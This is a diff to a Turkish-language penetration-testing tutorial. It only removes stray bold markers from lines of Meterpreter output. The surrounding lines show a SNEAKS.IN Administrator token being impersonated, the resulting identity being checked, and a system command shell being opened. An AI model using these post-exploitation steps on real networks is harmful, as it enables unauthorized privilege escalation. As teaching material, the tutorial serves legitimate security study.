@@ -164,8 +164,8 @@ Yukarıda listede bulunan `SNEAKS.IN\Administrator` isimli token fark ettiyseniz
 
 ```bash
 meterpreter > impersonate_token SNEAKS.IN\\Administrator
-**[**+] Delegation token available
-**[**+] Successfully impersonated user SNEAKS.IN\Administrator
+[+] Delegation token available
+[+] Successfully impersonated user SNEAKS.IN\Administrator
 meterpreter > getuid
 Server username: SNEAKS.IN\Administrator
 meterpreter >
@@ -188,7 +188,7 @@ Meterpreter içerisinde `execute -f cmd.exe -i -t` komutu ile komut satırında 
 meterpreter > shell
 Process 2804 created.
 Channel 1 created.
-Microsoft Windows XP **[**Version 5.1.2600]
+Microsoft Windows XP [Version 5.1.2600]
 (C) Copyright 1985-2001 Microsoft Corp.
 
 C:\WINDOWS\system32> whoami
